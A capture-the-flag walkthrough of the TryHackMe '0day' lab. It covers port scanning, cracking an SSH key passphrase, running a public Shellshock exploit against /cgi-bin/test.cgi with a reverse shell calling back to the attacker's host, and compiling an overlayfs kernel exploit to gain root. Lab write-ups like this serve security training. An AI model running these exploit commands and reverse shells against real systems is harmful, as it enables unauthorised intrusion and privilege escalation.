# [0day](https://tryhackme.com/room/0day) - TryHackMe

`07-08-2025`

[CTF](https://en.wikipedia.org/wiki/Capture_the_flag_%28cybersecurity%29) challenge solved.

## Starting with rustscan & nmap
 - Scanning the target to identify open ports

 ```
 $rustscan -a `cat ip.txt`

 ```

 ```

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

 ```

- We have port 22/tcp and 80/tcp open.


## Scanning more in-depth on the target

`$nmap -sVC -T5 -Pn -oN nmap/deep -p22,80 10.201.64.14`

```
Nmap scan report for 10.201.64.14
Host is up (0.31s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 0day
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


## Exploring the website on port 80/tcp (http)

- pages on the site (sitemap):

```

200 -    0B  - /admin/
200 -    0B  - /admin/index.html
200 -    1KB - /backup/
403 -  287B  - /cgi-bin/
200 -   13B  - /cgi-bin/test.cgi
200 -  452B  - /js/
200 -   38B  - /robots.txt
200 -   97B  - /secret/
200 -    0B  - /uploads/

```
Found an SSH private key in `/backup`, and the password for the private key was cracked using ssh2john, John the Ripper, and the rockyou.txt wordlist. Password: `letmein`, but no valid user was found to log in with this id_rsa private key, so moving on to analyze the `cgi-bin/test.cgi` and test shellshock exploits.


`$searchsploit shellschock`

```
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
Advantech Switch - 'Shellshock' Bash Environment Variable Command Inj | cgi/remote/38849.rb
Apache mod_cgi - 'Shellshock' Remote Command Injection                | linux/remote/34900.py
Bash - 'Shellshock' Environment Variables Command Injection           | linux/remote/34766.php
Bash CGI - 'Shellshock' Remote Command Injection (Metasploit)         | cgi/webapps/34895.rb
Cisco UCS Manager 2.1(1b) - Remote Command Injection (Shellshock)     | hardware/remote/39568.py
dhclient 4.1 - Bash Environment Variable Command Injection (Shellshoc | linux/remote/36933.py
GNU Bash - 'Shellshock' Environment Variable Command Injection        | linux/remote/34765.txt
IPFire - 'Shellshock' Bash Environment Variable Command Injection (Me | cgi/remote/39918.rb
NUUO NVRmini 2 3.0.8 - Remote Command Injection (Shellshock)          | cgi/webapps/40213.txt
OpenVPN 2.2.29 - 'Shellshock' Remote Command Injection                | linux/remote/34879.txt
PHP < 5.6.2 - 'Shellshock' Safe Mode / disable_functions Bypass / Com | php/webapps/35146.txt
Postfix SMTP 4.2.x < 4.2.48 - 'Shellshock' Remote Command Injection   | linux/remote/34896.py
RedStar 3.0 Server - 'Shellshock' 'BEAM' / 'RSSMON' Command Injection | linux/local/40938.py
Sun Secure Global Desktop and Oracle Global Desktop 4.61.915 - Comman | cgi/webapps/39887.txt
TrendMicro InterScan Web Security Virtual Appliance - 'Shellshock' Re | hardware/remote/40619.py

```
- The "Apache mod_cgi" seems to be interesting so copied the exploit.

`$ searchsploit -m linux/remote/34900.py`

- And run the script to see if we get a reverse shell.

`$./34900.py payload=reverse rhost=10.201.64.14 lhost=10.9.1.105 lport=4444`

```
[-] Trying exploit on : /cgi-bin/test.cgi
[!] Successfully exploited
[!] Incoming connection from 10.201.117.71
10.201.117.71> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```
- Successfully obtain the reverse shell; now it's time for privilege escalation.


## Privilege escalation

Found the user ryan directory at "/home/ryan", and inside that user directory found the user.txt flag.


After looking a while, found the kernel version of the machine is vulnerable: 
`Linux Ubuntu 3.13.0-32-generic`


- Searched for the version in searchsploit and found the exploit:

 `$ searchsploit Linux ubuntu 3.13.0-32`

 ```
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overla | linux/local/37292.c

 ```

- Copied the exploit to the current working directory

`$ searchsploit -m linux/local/37292.c`


- After compiling the file and running it, got root access:

`$ gcc 37292.c -o exploit && ./exploit`

```
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
```
Obtained access to root:
```
# whoami
whoami
root
# ls /root
ls /root
root.txt

```

Successfully owned the root and obtained the root.txt flag.
